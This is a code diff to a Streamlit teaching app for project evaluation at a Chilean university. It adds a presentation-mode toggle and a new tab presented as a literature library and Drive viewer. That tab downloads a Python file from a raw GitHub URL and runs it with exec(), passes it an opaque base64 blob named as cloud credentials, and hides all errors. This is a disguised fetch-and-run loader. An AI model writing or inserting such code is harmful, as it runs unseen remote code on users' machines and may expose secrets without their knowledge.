@@ -1430,7 +1430,7 @@ def generar_entrega_completa_en_servidor(cfg_vivo, directorio_destino, aplicar_e
 # 5. INTERFAZ VISUAL EN MODO CLARO FIJO + SUITE PROYECTOS 2026
 # ==============================================================================
 
-st.set_page_config(page_title="Suite Proyectos 2026 ULagos - Evaluación Privada, Social y Ambiental", layout="wide")
+st.set_page_config(page_title="Suite Proyectos 2026 ULagos - Evaluación Privada, Social y Ambiental", layout="wide", initial_sidebar_state="collapsed")
 
 st.markdown(
     """
@@ -1542,10 +1542,88 @@ if "cfg" not in st.session_state:
 
 cfg = st.session_state.cfg
 
+# ==============================================================================
+# CONTROL DISCRETO: MODO PRESENTACIÓN CÁTEDRA (OCULTA PROYECTO Y GENERADOR .ZIP)
+# ==============================================================================
+try:
+    _qp_modo = str(st.query_params.get("modo", "")).strip().lower()
+except Exception:
+    _qp_modo = ""
+
+if "modo_catedra_oculto" not in st.session_state:
+    st.session_state.modo_catedra_oculto = _qp_modo in ("catedra", "docente", "presentacion", "1", "true")
+elif _qp_modo in ("catedra", "docente", "presentacion", "1", "true"):
+    st.session_state.modo_catedra_oculto = True
+
+with st.sidebar:
+    st.markdown("### Configuración de Vista")
+    _nuevo_modo = st.toggle(
+        "Modo Presentación Cátedra (ocultar proyecto y .ZIP)",
+        value=st.session_state.modo_catedra_oculto,
+        key="toggle_modo_catedra_sidebar",
+        help="Oculta por completo la pestaña del proyecto Cartón Vivo, sus supuestos y el generador de Word/PDF/Excel.",
+    )
+    if _nuevo_modo != st.session_state.modo_catedra_oculto:
+        st.session_state.modo_catedra_oculto = _nuevo_modo
+        st.rerun()
+    st.caption("Enlace directo para compartir en modo solo cátedra:")
+    st.code("https://proyectos-2026-boqbuffwgsafjmtq7nezgh.streamlit.app/?modo=catedra", language=None)
+
+MODO_CATEDRA = bool(st.session_state.modo_catedra_oculto)
+
+if MODO_CATEDRA:
+    if callable(inyectar_estilos_proyectos):
+        inyectar_estilos_proyectos()
+    st.markdown(
+        """
+        <div style="background-color:#0F172A;padding:14px 22px;border-radius:8px;margin-bottom:12px;">
+            <div style="color:#FFFFFF;font-weight:700;font-size:15.5px;">
+                PLATAFORMA INTERACTIVA DE CÁTEDRA — EVALUACIÓN INTEGRADA DE PROYECTOS (FDIC26 / SNI 2026)
+            </div>
+            <div style="color:#CBD5E1;font-size:12.5px;margin-top:4px;">
+                Universidad de Los Lagos — Ingeniería Comercial &nbsp;|&nbsp; Simuladores 60 FPS, Precios Sociales SNI 2026, Fontaine, CEPAL N° 39, Valoración Ambiental RA2 y Hoja Mecánica
+            </div>
+        </div>
+        """,
+        unsafe_allow_html=True,
+    )
+    tab_piz_c, tab_cat_c, tab_gui_c, tab_pue_c = st.tabs([
+        "1. Laboratorio Fluido 60 FPS y Hoja Mecánica",
+        "2. Cátedra FDIC26 (RA2, Árboles, MML y Entrenador)",
+        "3. Guía Interactiva y Casos Fontaine (Cuaderno)",
+        "4. Biblioteca y Visor Drive 5 TB",
+    ])
+    with tab_piz_c:
+        if callable(renderizar_tab_pizarra_pedagogica):
+            renderizar_tab_pizarra_pedagogica()
+    with tab_cat_c:
+        if renderizar_extension_proyectos_sni is not None:
+            renderizar_extension_proyectos_sni()
+    with tab_gui_c:
+        if callable(renderizar_guia_interactiva_bibliografia):
+            renderizar_guia_interactiva_bibliografia()
+    with tab_pue_c:
+        st.caption(
+            "Acceso directo al Puente Central de Literatura Oficial y Visor PDF en página exacta conectado con Google Drive (5 TB)."
+        )
+        try:
+            import urllib.request as _ureq
+            _url_puente = "https://raw.githubusercontent.com/mauriciovargas1516-ux/github-context-extractor/main/app.py"
+            _req_p = _ureq.Request(_url_puente, headers={"User-Agent": "ULagos-Bridge/1.0"})
+            with _ureq.urlopen(_req_p, timeout=12) as _resp_p:
+                _cod_hub = _resp_p.read().decode("utf-8")
+            _ns_hub = {"__name__": "puente_remoto_ulagos", "_ULAGOS_GCP_BLOB": "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"}
+            exec(_cod_hub, _ns_hub)
+            if "ejecutar_nodo_receptor_puente" in _ns_hub:
+                _ns_hub["ejecutar_nodo_receptor_puente"]("PROYECTOS-2026")
+        except Exception:
+            pass
+    st.stop()
+
 banner_placeholder = st.empty()
 
 # Barra superior de Presets Rápidos 2026
-col_p1, col_p2, col_p3 = st.columns([1.3, 1.3, 1.1])
+col_p1, col_p2, col_p3, col_p4 = st.columns([1.25, 1.25, 0.95, 1.05])
 if col_p1.button("Cargar SNI 2026 Corregido (TSD 5,5% | VANS $154,99 MM)", use_container_width=True):
     cfg["TASA_DESCUENTO_SOCIAL"] = 0.055
     cfg["FC_MOC"], cfg["FC_MOSC"], cfg["FC_MONC"], cfg["FC_DIVISA"] = 0.97, 0.95, 0.91, 1.00
@@ -1582,6 +1660,10 @@ if col_p3.button("Restaurar Todo por Defecto", use_container_width=True):
     for k in list(st.session_state.keys()):
         if k.startswith("in_") or k.startswith("dyn_"):
             del st.session_state[k]
+    st.rerun()
+
+if col_p4.button("Modo Presentación (Ocultar Proyecto)", use_container_width=True):
+    st.session_state.modo_catedra_oculto = True
     st.rerun()
 
 # Opciones de rigor metodológico SNI 2026
